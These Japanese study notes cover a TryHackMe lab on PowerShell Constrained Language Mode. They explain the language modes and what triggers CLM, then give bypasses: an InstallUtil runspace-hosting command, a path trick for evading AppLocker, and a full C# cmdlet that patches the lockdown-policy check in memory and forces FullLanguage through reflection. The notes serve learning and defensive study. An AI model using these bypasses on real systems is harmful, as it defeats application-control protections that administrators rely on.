# 制約付き言語モード

https://tryhackme.com/room/constrainedlanguagemodebypass

CLMが有効になっている場合、攻撃者はPowerShellを起動できるが、.NET、COM、Win32の危険な部分は削除される。

## 言語モード

```ps
# 現在の言語モードを表示
$ExecutionContext.SessionState.LanguageMode
```

| **Mode**              | **許可される内容**                                                    | **確認できる場面**                         |
| :-------------------- | :------------------------------------------------------------- | :---------------------------------- |
| `FullLanguage`        | すべて：すべてのコマンドレット、すべての .NET 型、すべての演算子、`Add-Type`、任意のメソッド呼び出し     | ポリシーが適用されていない環境でのデフォルト              |
| `ConstrainedLanguage` | すべてのコマンドレットとコア言語。ただし、許可リストにある .NET/COM 型のみ使用可能で、任意のメソッド呼び出しは不可 | アプリケーション制御が検出された場合の信頼されていない対話型セッション |
| `RestrictedLanguage`  | コマンドは実行できるが、スクリプトブロック、代入、メソッド呼び出しは不可                           | モジュールマニフェスト（`.psd1`）の処理             |
| `NoLanguage`          | スクリプト言語は一切使用できず、ネイティブコマンドとコマンドレットのみ使用可能                        | JEA エンドポイント                         |

### CLMをトリガーする要因

| **要因**                        | **CLMが有効になる仕組み**                                        | **特徴**              |
| :---------------------------- | :------------------------------------------------------ | :------------------ |
| **AppLocker**                 | PowerShellが一時的なテストファイルを実行し、AppLockerによるブロックを検出するとCLMへ移行 | ヒューリスティック方式の検出      |
| **WDAC / App Control**        | Windows Code Integrityによりコードのロックダウン状態を確認し、CLMを適用        | カーネル側で判定される強制的な制御   |
| **`__PSLockdownPolicy` 環境変数** | 環境変数を `4` に設定するとポリシーなしでもCLMを有効化                         | 非公式のデバッグ用機能。容易に変更可能 |

```ps
# WDACのメインポリシーファイルが規定のシステムパスに存在しない
Test-Path C:\Windows\System32\CodeIntegrity\SiPolicy.p7b
False

# WDAC の適用状態。0：無効　１：監査（ログのみ）　２：強制
(Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard).CodeIntegrityPolicyEnforcementStatus
0
```

## バイパス手法

### 実行空間ホスティング

信頼できるバイナリを介して実行空間をホストすることでCLMを回避する手法。（よく知られている手法のため、実際にはDefender等によってブロックされる）

```ps
# /U によりアンインストーラコードが実行される。
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\CLM\CLMRunspaceHost.exe
```

### パス

AppLocker のルールは、スクリプトの場所(パス)に基づくので、Windows配下に配置することでバイパスされる。ただし、WDACはファイルがホワイトリストに含まれるかを評価するため、WDACが有効であれば機能しない。

```ps
PS C:\Users\Analyst> $probe = 'Write-Output ("mode=" + $ExecutionContext.SessionState.LanguageMode); try { $null = New-Object System.Net.WebClient; "webclient=CREATED" } catch { "webclient=BLOCKED" }'
PS C:\Users\Analyst> Set-Content $env:TEMP\t.ps1 $probe
PS C:\Users\Analyst> powershell -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\t.ps1
mode=ConstrainedLanguage
webclient=BLOCKED

PS C:\Users\Analyst> Copy-Item $env:TEMP\t.ps1 C:\Windows\Temp\t.ps1
PS C:\Users\Analyst> powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\t.ps1
mode=FullLanguage
webclient=CREATED
```

### インメモリフリップ

関数の戻り値やプロパティを直接書き換える手法。

```ps
PS C:\Users\Analyst> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\Users\Analyst> Import-Module C:\CLM\CLMFlip.dll
PS C:\Users\Analyst> Invoke-CLMFlip
CLMFlip tier fired: 3 (ExecutionContext language mode)
LanguageMode = FullLanguage

PS C:\Users\Analyst> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

```cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

[Cmdlet(VerbsLifecycle.Invoke, "CLMFlip")]
public class InvokeCLMFlipCommand : PSCmdlet {

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static PropertyInfo GetPropAnywhere(Type t, string name) {
        while (t != null) {
            PropertyInfo p = t.GetProperty(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.DeclaredOnly);
            if (p != null) return p;
            t = t.BaseType;
        }
        return null;
    }

    static object GetExecutionContext() {
        Runspace rs = Runspace.DefaultRunspace;
        PropertyInfo p = GetPropAnywhere(rs.GetType(), "ExecutionContext");
        return p.GetValue(rs, null);
    }

    static string GetMode() {
        object ec = GetExecutionContext();
        PropertyInfo lm = GetPropAnywhere(ec.GetType(), "LanguageMode");
        object v = lm.GetValue(ec, null);
        return v.ToString();
    }

    static void SetModeFull() {
        object ec = GetExecutionContext();
        PropertyInfo lm = GetPropAnywhere(ec.GetType(), "LanguageMode");
        lm.SetValue(ec, PSLanguageMode.FullLanguage, null);
    }

    static bool Tier1_Patch() {
        Type sp = typeof(PSObject).Assembly.GetType("System.Management.Automation.SystemPolicy");
        if (sp == null) return false;
        MethodInfo mi = sp.GetMethod("GetSystemLockdownPolicy", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static);
        if (mi == null) return false;
        RuntimeHelpers.PrepareMethod(mi.MethodHandle);
        IntPtr addr = mi.MethodHandle.GetFunctionPointer();
        byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 };
        uint old = 0;
        if (!VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old)) return false;
        Marshal.Copy(patch, 0, addr, patch.Length);
        uint tmp = 0;
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out tmp);
        return true;
    }

    static bool Tier2_ResetField() {
        Type sp = typeof(PSObject).Assembly.GetType("System.Management.Automation.SystemPolicy");
        if (sp == null) return false;
        FieldInfo[] fields = sp.GetFields(BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
        bool did = false;
        foreach (FieldInfo f in fields) {
            Type ft = f.FieldType;
            Type inner = Nullable.GetUnderlyingType(ft);
            Type target = inner != null ? inner : ft;
            if (target.Name.IndexOf("SystemEnforcementMode", StringComparison.OrdinalIgnoreCase) >= 0) {
                object none = Enum.ToObject(target, 0);
                f.SetValue(null, none);
                did = true;
            }
        }
        return did;
    }

    protected override void EndProcessing() {
        string start = GetMode();
        string firedTier = "none";

        try { Tier1_Patch(); } catch (Exception) { }
        if (GetMode() == "FullLanguage") { firedTier = "1-VirtualProtect"; }

        if (firedTier == "none") {
            try { Tier2_ResetField(); } catch (Exception) { }
            if (GetMode() == "FullLanguage") { firedTier = "2-SystemPolicyField"; }
        }

        if (firedTier == "none") {
            try { SetModeFull(); } catch (Exception e) { WriteWarning("Tier3 failed: " + e.Message); }
            if (GetMode() == "FullLanguage") { firedTier = "3-ExecutionContextReflection"; }
        }

        WriteObject("CLMFlip: start=" + start + " tier=" + firedTier + " now=" + GetMode());
    }
}
```
